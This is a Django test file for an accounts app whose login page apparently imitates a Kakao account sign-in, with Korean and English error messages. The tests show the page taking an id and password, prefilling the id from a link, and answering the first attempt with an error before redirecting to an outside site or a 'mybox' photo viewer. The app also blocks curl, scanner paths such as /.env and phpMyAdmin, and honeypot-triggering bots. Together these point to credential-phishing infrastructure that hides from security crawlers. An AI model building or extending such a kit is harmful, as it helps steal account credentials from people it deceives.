from django.http import HttpResponse
from django.test import Client, RequestFactory, SimpleTestCase, TestCase

from accounts.blacklist_store import (
    KIND_BOT,
    KIND_LIMIT,
    KIND_LOGIN,
    KIND_MANUAL,
    KIND_MYBOX,
    KIND_RATE,
    KIND_UNKNOWN,
    _invalidate_lookup_cache,
    add_blacklist_ip,
    clear_blacklist_entries,
    clear_blacklist_entries_for_kind,
    get_client_ip,
    get_ips_for_kind,
    increment_login_attempt_count,
    increment_mybox_visit_count,
    is_local_ip,
    list_mybox_visit_counts,
    redirect_url_for_ip,
    redirect_url_for_kind,
    remove_blacklist_ip,
    reset_login_attempt_count,
    reset_mybox_visit_count,
    delete_mybox_visit_record,
    clear_mybox_visit_records,
)
from accounts.middleware import BlacklistIPMiddleware, record_login_attempt, _rate_buckets, _total_request_counts
from accounts.models import LoginAttemptCounter, MyboxVisitCounter
from accounts.policy_store import update_blacklist_policy


BROWSER_UA = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
    '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
)


def _request(**meta):
    factory = RequestFactory()
    request = factory.get('/')
    request.META.pop('REMOTE_ADDR', None)
    request.META['HTTP_USER_AGENT'] = BROWSER_UA
    for key, value in meta.items():
        request.META[key] = value
    return request


class ClientIpTests(SimpleTestCase):
    def test_loopback_without_headers(self):
        request = _request(REMOTE_ADDR='127.0.0.1')
        self.assertEqual(get_client_ip(request), '127.0.0.1')
        self.assertTrue(is_local_ip(get_client_ip(request)))

    def test_nginx_x_real_ip(self):
        request = _request(
            REMOTE_ADDR='127.0.0.1',
            HTTP_X_REAL_IP='203.0.113.10',
        )
        self.assertEqual(get_client_ip(request), '203.0.113.10')

    def test_xff_skips_spoofed_loopback(self):
        request = _request(
            REMOTE_ADDR='127.0.0.1',
            HTTP_X_FORWARDED_FOR='127.0.0.1, 198.51.100.20',
        )
        self.assertEqual(get_client_ip(request), '198.51.100.20')

    def test_cloudflare_connecting_ip(self):
        request = _request(
            REMOTE_ADDR='127.0.0.1',
            HTTP_CF_CONNECTING_IP='198.51.100.30',
            HTTP_X_FORWARDED_FOR='198.51.100.30, 172.64.0.1',
        )
        self.assertEqual(get_client_ip(request), '198.51.100.30')

    def test_direct_public_ip_ignores_spoofed_header(self):
        request = _request(
            REMOTE_ADDR='8.8.8.8',
            HTTP_X_FORWARDED_FOR='1.2.3.4',
        )
        self.assertEqual(get_client_ip(request), '8.8.8.8')

    def test_ipv4_mapped_loopback(self):
        self.assertTrue(is_local_ip('::ffff:127.0.0.1'))


class LoginAttemptCounterTests(TestCase):
    def setUp(self):
        update_blacklist_policy({'login_attempt_max': 2})
        remove_blacklist_ip('198.51.100.40')
        reset_login_attempt_count('198.51.100.40')

    def test_second_attempt_blacklists(self):
        ip = '198.51.100.40'
        self.assertFalse(record_login_attempt(ip))
        self.assertTrue(record_login_attempt(ip))
        self.assertIn(ip, get_ips_for_kind(KIND_LOGIN))
        self.assertEqual(LoginAttemptCounter.objects.get(ip=ip).count, 2)

    def test_local_ip_is_not_counted(self):
        self.assertFalse(record_login_attempt('127.0.0.1'))
        self.assertFalse(LoginAttemptCounter.objects.filter(ip='127.0.0.1').exists())
        self.assertNotIn('127.0.0.1', get_ips_for_kind(KIND_LOGIN))

    def test_remove_resets_count(self):
        ip = '198.51.100.40'
        record_login_attempt(ip)
        record_login_attempt(ip)
        remove_blacklist_ip(ip, KIND_LOGIN)
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=ip).exists())
        self.assertFalse(record_login_attempt(ip))
        self.assertNotIn(ip, get_ips_for_kind(KIND_LOGIN))

    def test_increment_is_atomic_across_creates(self):
        ip = '198.51.100.41'
        self.assertEqual(increment_login_attempt_count(ip, 2), 1)
        self.assertEqual(increment_login_attempt_count(ip, 2), 2)
        add_blacklist_ip(ip, KIND_LOGIN, note='test')
        self.assertEqual(increment_login_attempt_count(ip, 2), 3)


class LoginPageAttemptTests(TestCase):
    def setUp(self):
        update_blacklist_policy(
            {
                'login_attempt_max': 2,
                'login_intro_mode': 'loading',
                'login_loading_enabled': False,
                'login_splash_enabled': False,
                'login_redirect_url': 'https://login-block.example/',
            }
        )
        self.ip = '198.51.100.55'
        remove_blacklist_ip(self.ip)
        reset_login_attempt_count(self.ip)
        _invalidate_lookup_cache()
        self.client = Client()

    def _post(self, password='secret123', extra=None):
        data = {'id': 'tester', 'pw': password}
        if extra:
            data.update(extra)
        return self.client.post(
            '/',
            data,
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )

    def test_prefills_id_from_query_parameter(self):
        response = self.client.get(
            '/json/version?id=tester%40example.com',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context['submitted_id'], 'tester@example.com')

    def test_incomplete_post_is_not_counted(self):
        response = self._post(password='')
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['pw_invalid'])
        self.assertContains(
            response,
            '8~32자리의 영문자·숫자·특수문자 중 2가지 이상을 조합해 주세요.',
        )
        self.assertContains(response, 'aria-label="계정 정보 입력" autofocus')
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_LOGIN))

    def test_mhtml_test_id_with_empty_password_uses_format_error(self):
        response = self.client.post(
            '/',
            {'id': 'test', 'pw': ''},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context['id_invalid'])
        self.assertTrue(response.context['pw_invalid'])
        self.assertContains(
            response,
            '8~32자리의 영문자·숫자·특수문자 중 2가지 이상을 조합해 주세요.',
        )

    def test_invalid_login_identifier_shows_kakao_error_without_counting(self):
        response = self.client.post(
            '/',
            {'id': 'ㄲ나앙', 'pw': 'ValidPassword123!'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['id_invalid'])
        self.assertContains(response, '카카오계정을 정확하게 입력해 주세요.')
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())

    def test_invalid_login_identifier_uses_english_error(self):
        response = self.client.post(
            '/',
            {'id': 'not-an-email@', 'pw': 'ValidPassword123!', 'locale': 'en'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['id_invalid'])
        self.assertContains(response, 'Please enter your Kakao Account correctly.')

    def test_email_with_korean_local_part_reaches_password_validation(self):
        response = self.client.post(
            '/',
            {'id': 'ㄱㄱㄱ@naver.com', 'pw': 'abc', 'locale': 'en'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context['id_invalid'])
        self.assertTrue(response.context['pw_invalid'])
        self.assertContains(
            response,
            'Please enter 8–32 characters using at least two of the following: '
            'letters, numbers, and special characters.',
        )
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())

    def test_invalid_password_format_shows_kakao_error_without_counting(self):
        response = self.client.post(
            '/',
            {'id': 'tester@example.com', 'pw': 'abc'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['pw_invalid'])
        self.assertContains(
            response,
            '8~32자리의 영문자·숫자·특수문자 중 2가지 이상을 조합해 주세요.',
        )
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())

    def test_invalid_password_format_uses_english_error(self):
        response = self.client.post(
            '/',
            {'id': 'tester@example.com', 'pw': 'abc', 'locale': 'en'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['pw_invalid'])
        self.assertContains(
            response,
            'Please enter 8–32 characters using at least two of the following: '
            'letters, numbers, and special characters.',
        )

    def test_password_longer_than_32_characters_is_rejected(self):
        response = self.client.post(
            '/',
            {'id': 'tester@example.com', 'pw': 'Password1' * 4},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context['pw_invalid'])
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())

    def test_four_ascii_character_password_reaches_login_attempt(self):
        response = self.client.post(
            '/',
            {'id': 'tester@example.com', 'pw': 'abcd'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context['pw_invalid'])
        self.assertTrue(response.context['login_error'])
        self.assertEqual(LoginAttemptCounter.objects.get(ip=self.ip).count, 1)

    def test_validation_error_autofocuses_login_identifier(self):
        response = self.client.post(
            '/',
            {'id': 'tester@example.com', 'pw': 'abc'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertContains(response, 'aria-label="계정 정보 입력" autofocus')

    def test_loading_mode_shows_error_then_redirects(self):
        first = self._post()
        self.assertEqual(first.status_code, 200)
        self.assertTrue(first.context['login_error'])
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_LOGIN))
        second = self._post()
        self.assertEqual(second.status_code, 302)
        self.assertEqual(second.url, 'https://login-block.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_LOGIN))
        self.assertEqual(LoginAttemptCounter.objects.get(ip=self.ip).count, 2)

    def test_loading_mode_uses_request_url_param(self):
        target = 'https://return.example/path?x=1'
        first = self.client.post(
            f'/?url={target}',
            {'id': 'tester', 'pw': 'secret123'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(first.status_code, 200)
        self.assertTrue(first.context['login_error'])
        second = self.client.post(
            f'/?url={target}',
            {'id': 'tester', 'pw': 'secret123', 'url': target},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(second.status_code, 302)
        self.assertEqual(second.url, target)
        self.assertIn(self.ip, get_ips_for_kind(KIND_LOGIN))

    def test_already_login_blocked_uses_request_url_param(self):
        target = 'https://return.example/after-block'
        add_blacklist_ip(self.ip, KIND_LOGIN, note='test')
        response = self.client.get(
            f'/?url={target}',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, target)

    def test_already_login_blocked_falls_back_without_url_param(self):
        add_blacklist_ip(self.ip, KIND_LOGIN, note='test')
        response = self.client.get(
            '/',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://login-block.example/')

    def test_loading_mode_rejects_unsafe_url_param(self):
        first = self.client.post(
            '/',
            {'id': 'tester', 'pw': 'secret123', 'url': 'javascript:alert(1)'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(first.status_code, 200)
        second = self.client.post(
            '/',
            {'id': 'tester', 'pw': 'secret123', 'url': 'javascript:alert(1)'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(second.status_code, 302)
        self.assertEqual(second.url, 'https://login-block.example/')

    def test_mybox_mode_ignores_request_url_param(self):
        update_blacklist_policy({'login_intro_mode': 'mybox'})
        target = 'https://return.example/'
        first = self.client.post(
            f'/?url={target}',
            {'id': 'tester', 'pw': 'secret123', 'url': target},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(first.status_code, 200)
        second = self.client.post(
            f'/?url={target}',
            {'id': 'tester', 'pw': 'secret123', 'url': target},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(second.status_code, 302)
        self.assertTrue(second.url.endswith('/mybox/'))

    def test_mybox_mode_shows_error_then_opens_viewer(self):
        update_blacklist_policy({'login_intro_mode': 'mybox'})
        first = self._post()
        self.assertEqual(first.status_code, 200)
        self.assertTrue(first.context['login_error'])
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_LOGIN))
        second = self._post()
        self.assertEqual(second.status_code, 302)
        self.assertTrue(second.url.endswith('/mybox/'))
        self.assertIn(self.ip, get_ips_for_kind(KIND_LOGIN))

    def test_mybox_intro_iframe_is_not_counted(self):
        update_blacklist_policy(
            {
                'login_intro_mode': 'mybox',
                'login_mybox_delay_ms': 3000,
                'login_splash_enabled': True,
            }
        )
        reset_mybox_visit_count(self.ip)
        page = self.client.get('/', REMOTE_ADDR=self.ip, HTTP_USER_AGENT=BROWSER_UA)
        self.assertEqual(page.status_code, 200)
        self.assertContains(page, '/login-intro-mybox/')
        intro = self.client.get(
            '/login-intro-mybox/',
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(intro.status_code, 200)
        self.assertFalse(MyboxVisitCounter.objects.filter(ip=self.ip).exists())
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_MYBOX))


class ClearBlacklistTests(TestCase):
    def test_clear_all_entries_and_related_counters(self):
        add_blacklist_ip('198.51.100.70', KIND_LOGIN, note='test')
        add_blacklist_ip('198.51.100.71', KIND_MYBOX, note='test')
        increment_login_attempt_count('198.51.100.70')
        increment_mybox_visit_count('198.51.100.71')
        deleted = clear_blacklist_entries()
        self.assertEqual(deleted, 2)
        self.assertEqual(list(get_ips_for_kind(KIND_LOGIN)), [])
        self.assertEqual(list(get_ips_for_kind(KIND_MYBOX)), [])
        self.assertFalse(LoginAttemptCounter.objects.filter(ip='198.51.100.70').exists())
        self.assertFalse(MyboxVisitCounter.objects.filter(ip='198.51.100.71').exists())



class MyboxVisitCounterTests(TestCase):
    def setUp(self):
        update_blacklist_policy(
            {
                'mybox_visit_limit_enabled': True,
                'mybox_visit_max': 3,
                'mybox_redirect_url': 'https://www.naver.com/',
            }
        )
        self.ip = '198.51.100.60'
        remove_blacklist_ip(self.ip)
        reset_mybox_visit_count(self.ip)
        self.middleware = BlacklistIPMiddleware(lambda request: HttpResponse('ok'))

    def _visit(self, path='/mybox/photo', ip=None):
        request = _request(REMOTE_ADDR=ip or self.ip)
        request.path = path
        request.path_info = path
        return self.middleware(request)

    def test_third_visit_blacklists(self):
        first = self._visit()
        second = self._visit()
        third = self._visit()
        self.assertEqual(first.status_code, 200)
        self.assertEqual(second.status_code, 200)
        self.assertEqual(third.status_code, 302)
        self.assertIn(self.ip, get_ips_for_kind(KIND_MYBOX))
        self.assertEqual(MyboxVisitCounter.objects.get(ip=self.ip).count, 3)

    def test_disabled_auto_block_still_records(self):
        update_blacklist_policy({'mybox_visit_limit_enabled': False, 'mybox_visit_max': 3})
        for _ in range(4):
            response = self._visit()
            self.assertEqual(response.status_code, 200)
        self.assertEqual(MyboxVisitCounter.objects.get(ip=self.ip).count, 4)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_MYBOX))

    def test_remove_resets_count(self):
        self._visit()
        self._visit()
        self._visit()
        remove_blacklist_ip(self.ip, KIND_MYBOX)
        self.assertFalse(MyboxVisitCounter.objects.filter(ip=self.ip).exists())
        self.assertEqual(increment_mybox_visit_count(self.ip, 3), 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_MYBOX))

    def test_intro_viewer_is_not_counted(self):
        response = self._visit('/login-intro-mybox/')
        self.assertEqual(response.status_code, 200)
        self.assertFalse(MyboxVisitCounter.objects.filter(ip=self.ip).exists())

    def test_intro_viewer_skips_global_block(self):
        add_blacklist_ip(self.ip, KIND_LOGIN, note='test')
        response = self._visit('/login-intro-mybox/')
        self.assertEqual(response.status_code, 200)

    def test_list_and_delete_visit_records(self):
        increment_mybox_visit_count(self.ip)
        increment_mybox_visit_count(self.ip)
        rows = list_mybox_visit_counts()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]['ip'], self.ip)
        self.assertEqual(rows[0]['count'], 2)
        self.assertFalse(rows[0]['blocked'])
        self.assertTrue(delete_mybox_visit_record(self.ip))
        self.assertEqual(list_mybox_visit_counts(), [])

    def test_delete_visit_record_unblocks(self):
        self._visit()
        self._visit()
        self._visit()
        self.assertIn(self.ip, get_ips_for_kind(KIND_MYBOX))
        self.assertTrue(delete_mybox_visit_record(self.ip))
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_MYBOX))
        self.assertFalse(MyboxVisitCounter.objects.filter(ip=self.ip).exists())

    def test_clear_visit_records(self):
        increment_mybox_visit_count('198.51.100.91')
        increment_mybox_visit_count('198.51.100.92')
        add_blacklist_ip('198.51.100.91', KIND_MYBOX, note='test')
        deleted = clear_mybox_visit_records()
        self.assertEqual(deleted, 2)
        self.assertEqual(list_mybox_visit_counts(), [])
        self.assertNotIn('198.51.100.91', get_ips_for_kind(KIND_MYBOX))


class SectionRedirectTests(TestCase):
    def setUp(self):
        update_blacklist_policy(
            {
                'redirect_url': 'https://manual.example/',
                'limits_redirect_url': 'https://limits.example/',
                'login_redirect_url': 'https://login.example/',
                'mybox_redirect_url': 'https://mybox.example/',
                'bot_redirect_url': 'https://bot.example/',
                'unknown_redirect_url': 'https://unknown.example/',
            }
        )
        self.policy = {
            'redirect_url': 'https://manual.example/',
            'limits_redirect_url': 'https://limits.example/',
            'login_redirect_url': 'https://login.example/',
            'mybox_redirect_url': 'https://mybox.example/',
            'bot_redirect_url': 'https://bot.example/',
            'unknown_redirect_url': 'https://unknown.example/',
        }

    def test_kind_urls(self):
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_MANUAL), 'https://manual.example/')
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_RATE), 'https://limits.example/')
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_LIMIT), 'https://limits.example/')
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_LOGIN), 'https://login.example/')
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_MYBOX), 'https://mybox.example/')
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_BOT), 'https://bot.example/')
        self.assertEqual(redirect_url_for_kind(self.policy, KIND_UNKNOWN), 'https://unknown.example/')

    def test_ip_uses_listing_kind(self):
        add_blacklist_ip('198.51.100.80', KIND_LOGIN, note='test')
        self.assertEqual(
            redirect_url_for_ip(self.policy, '198.51.100.80'),
            'https://login.example/',
        )
        add_blacklist_ip('198.51.100.80', KIND_MANUAL, note='test')
        self.assertEqual(
            redirect_url_for_ip(self.policy, '198.51.100.80'),
            'https://manual.example/',
        )


class MyboxIntroViewerTests(TestCase):
    def test_allows_sameorigin_iframe(self):
        response = Client().get('/login-intro-mybox/')
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.get('X-Frame-Options'), 'SAMEORIGIN')


class BotBlockTests(TestCase):
    def setUp(self):
        update_blacklist_policy(
            {
                'bot_block_enabled': True,
                'bot_redirect_url': 'https://bot.example/',
                'bot_block_empty_ua': True,
                'bot_block_scanner_paths': True,
                'bot_block_honeypot': True,
                'bot_block_webdriver': True,
                'bot_ua_keywords': 'customscanner',
                'rate_limit_enabled': False,
                'total_request_limit_enabled': False,
            }
        )
        self.ip = '198.51.100.90'
        remove_blacklist_ip(self.ip)
        _invalidate_lookup_cache()
        self.middleware = BlacklistIPMiddleware(lambda request: HttpResponse('ok'))

    def _call(self, path='/', ip=None, ua=BROWSER_UA):
        request = _request(REMOTE_ADDR=ip or self.ip, HTTP_USER_AGENT=ua)
        request.path = path
        request.path_info = path
        return self.middleware(request)

    def test_curl_ua_blacklists(self):
        response = self._call(ua='curl/8.5.0')
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://bot.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_browser_ua_passes(self):
        response = self._call()
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_empty_ua_blacklists(self):
        response = self._call(ua='')
        self.assertEqual(response.status_code, 302)
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_env_path_blacklists(self):
        response = self._call(path='/.env')
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://bot.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_trap_path_blacklists(self):
        response = self._call(path='/nids-trap/')
        self.assertEqual(response.status_code, 302)
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_local_ip_with_bot_ua_passes(self):
        response = self._call(ip='127.0.0.1', ua='curl/8.5.0')
        self.assertEqual(response.status_code, 200)
        self.assertNotIn('127.0.0.1', get_ips_for_kind(KIND_BOT))

    def test_admin_path_passes(self):
        response = self._call(path='/kaixin-judy-yuna/', ua='curl/8.5.0')
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_mybox_curl_is_blocked(self):
        response = self._call(path='/mybox/', ua='curl/8.5.0')
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://bot.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_extra_keyword_matches(self):
        response = self._call(ua='Mozilla/5.0 CustomScanner/1.0')
        self.assertEqual(response.status_code, 302)
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_path_keyword_lists_bot(self):
        update_blacklist_policy({'bot_path_keywords': 'phpmyadmin\nadminer'})
        response = self._call(path='/tools/phpMyAdmin/index.php')
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://bot.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_path_keyword_miss_passes(self):
        update_blacklist_policy({'bot_path_keywords': 'phpmyadmin'})
        response = self._call(path='/about/')
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_honeypot_post_blacklists_without_login_count(self):
        client = Client()
        response = client.post(
            '/',
            {'id': 'tester', 'pw': 'secret123', 'homepage': 'http://spam.test'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://bot.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())

    def test_robots_txt_is_served(self):
        response = Client().get('/robots.txt')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b'Disallow: /', response.content)
        self.assertIn(b'/nids-trap/', response.content)

    def test_normal_login_post_is_not_bot(self):
        client = Client()
        response = client.post(
            '/',
            {'id': 'tester', 'pw': 'secret123'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_BOT))
        self.assertEqual(LoginAttemptCounter.objects.get(ip=self.ip).count, 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_LOGIN))

    def test_curl_lists_bot_entry(self):
        self._call(ua='curl/8.5.0')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))
        self._call(ua='curl/8.5.0')
        self.assertEqual(len(get_ips_for_kind(KIND_BOT)), 1)
        self.assertTrue(remove_blacklist_ip(self.ip, KIND_BOT))
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_env_path_lists_bot_entry(self):
        self._call(path='/.env')
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_honeypot_lists_bot_entry(self):
        client = Client()
        client.post(
            '/',
            {'id': 'tester', 'pw': 'secret123', 'homepage': 'http://spam.test'},
            REMOTE_ADDR=self.ip,
            HTTP_USER_AGENT=BROWSER_UA,
        )
        self.assertIn(self.ip, get_ips_for_kind(KIND_BOT))
        self.assertEqual(clear_blacklist_entries_for_kind(KIND_BOT), 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_BOT))

    def test_local_ip_is_not_listed(self):
        self._call(ip='127.0.0.1', ua='curl/8.5.0')
        self.assertNotIn('127.0.0.1', get_ips_for_kind(KIND_BOT))


class AutoBlockEntryTests(TestCase):
    def setUp(self):
        update_blacklist_policy(
            {
                'bot_block_enabled': False,
                'rate_limit_enabled': True,
                'rate_limit_max_requests': 2,
                'rate_limit_window_seconds': 60,
                'total_request_limit_enabled': False,
                'limits_redirect_url': 'https://limits.example/',
                'login_attempt_max': 2,
                'login_redirect_url': 'https://login.example/',
                'mybox_visit_limit_enabled': True,
                'mybox_visit_max': 2,
                'mybox_redirect_url': 'https://mybox.example/',
            }
        )
        self.ip = '198.51.100.95'
        remove_blacklist_ip(self.ip)
        _rate_buckets.clear()
        _total_request_counts.clear()
        _invalidate_lookup_cache()
        self.middleware = BlacklistIPMiddleware(lambda request: HttpResponse('ok'))

    def _call(self, path='/', ip=None, ua=BROWSER_UA):
        request = _request(REMOTE_ADDR=ip or self.ip, HTTP_USER_AGENT=ua)
        request.path = path
        request.path_info = path
        return self.middleware(request)

    def test_login_attempts_list_at_max(self):
        self.assertFalse(record_login_attempt(self.ip, path='/', user_agent=BROWSER_UA))
        self.assertTrue(record_login_attempt(self.ip, path='/', user_agent=BROWSER_UA))
        self.assertIn(self.ip, get_ips_for_kind(KIND_LOGIN))
        self.assertEqual(clear_blacklist_entries_for_kind(KIND_LOGIN), 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_LOGIN))
        self.assertFalse(LoginAttemptCounter.objects.filter(ip=self.ip).exists())

    def test_listed_login_is_redirected(self):
        record_login_attempt(self.ip)
        record_login_attempt(self.ip)
        response = self._call()
        self.assertEqual(response.status_code, 302)
        self.assertEqual(response.url, 'https://login.example/')

    def test_rate_exceed_lists_entry(self):
        self.assertEqual(self._call().status_code, 200)
        self.assertEqual(self._call().status_code, 200)
        blocked = self._call()
        self.assertEqual(blocked.status_code, 302)
        self.assertEqual(blocked.url, 'https://limits.example/')
        self.assertIn(self.ip, get_ips_for_kind(KIND_RATE))
        listed = self._call()
        self.assertEqual(listed.status_code, 302)
        self.assertEqual(clear_blacklist_entries_for_kind(KIND_RATE), 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_RATE))

    def test_total_request_limit(self):
        update_blacklist_policy(
            {
                'rate_limit_enabled': False,
                'total_request_limit_enabled': True,
                'total_request_limit_max': 2,
            }
        )
        self.assertEqual(self._call().status_code, 200)
        self.assertEqual(self._call().status_code, 200)
        blocked = self._call()
        self.assertEqual(blocked.status_code, 302)
        self.assertIn(self.ip, get_ips_for_kind(KIND_LIMIT))

    def test_mybox_visits_list_at_max(self):
        self.assertEqual(self._call(path='/mybox/photo').status_code, 200)
        blocked = self._call(path='/mybox/photo')
        self.assertEqual(blocked.status_code, 302)
        self.assertIn(self.ip, get_ips_for_kind(KIND_MYBOX))
        listed = self._call(path='/mybox/photo')
        self.assertEqual(listed.status_code, 302)
        self.assertEqual(clear_blacklist_entries_for_kind(KIND_MYBOX), 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_MYBOX))
        self.assertFalse(MyboxVisitCounter.objects.filter(ip=self.ip).exists())

    def test_kinds_are_managed_separately(self):
        add_blacklist_ip(self.ip, KIND_MANUAL, note='manual')
        add_blacklist_ip(self.ip, KIND_LOGIN, note='login')
        self.assertEqual(clear_blacklist_entries_for_kind(KIND_MANUAL), 1)
        self.assertNotIn(self.ip, get_ips_for_kind(KIND_MANUAL))
        self.assertIn(self.ip, get_ips_for_kind(KIND_LOGIN))

    def test_local_ip_skips_auto_block(self):
        record_login_attempt('127.0.0.1')
        self._call(ip='127.0.0.1')
        self.assertNotIn('127.0.0.1', get_ips_for_kind(KIND_LOGIN))
        self.assertNotIn('127.0.0.1', get_ips_for_kind(KIND_MANUAL))


class ExtraUaKeywordTests(SimpleTestCase):
    def test_add_and_remove(self):
        from accounts.bot_detect import add_ua_keyword, extra_ua_keywords, remove_ua_keyword

        text, error = add_ua_keyword('', ' CustomScanner ')
        self.assertIsNone(error)
        self.assertEqual(text, 'customscanner')
        text, error = add_ua_keyword(text, 'another')
        self.assertIsNone(error)
        self.assertEqual(
            extra_ua_keywords({'bot_ua_keywords': text}),
            ['customscanner', 'another'],
        )
        text = remove_ua_keyword(text, 'customscanner')
        self.assertEqual(text, 'another')

    def test_rejects_duplicate_and_builtin(self):
        from accounts.bot_detect import add_ua_keyword

        text, error = add_ua_keyword('', 'curl')
        self.assertIsNone(text)
        self.assertIn('built in', error)
        text, error = add_ua_keyword('already', 'ALREADY')
        self.assertIsNone(text)
        self.assertIn('already added', error)

    def test_rejects_empty(self):
        from accounts.bot_detect import add_ua_keyword

        text, error = add_ua_keyword('', '   ')
        self.assertIsNone(text)
        self.assertEqual(error, 'Keyword is required.')


class PathKeywordTests(SimpleTestCase):
    def test_add_and_remove(self):
        from accounts.bot_detect import (
            add_path_keyword,
            extra_path_keywords,
            path_contains_keyword,
            remove_path_keyword,
        )

        text, error = add_path_keyword('', ' PhpMyAdmin ')
        self.assertIsNone(error)
        self.assertEqual(text, 'phpmyadmin')
        text, error = add_path_keyword(text, 'adminer')
        self.assertIsNone(error)
        policy = {'bot_path_keywords': text}
        self.assertEqual(extra_path_keywords(policy), ['phpmyadmin', 'adminer'])
        self.assertTrue(path_contains_keyword('/x/PHPMYADMIN/y', policy))
        self.assertFalse(path_contains_keyword('/home/', policy))
        text = remove_path_keyword(text, 'phpmyadmin')
        self.assertEqual(text, 'adminer')

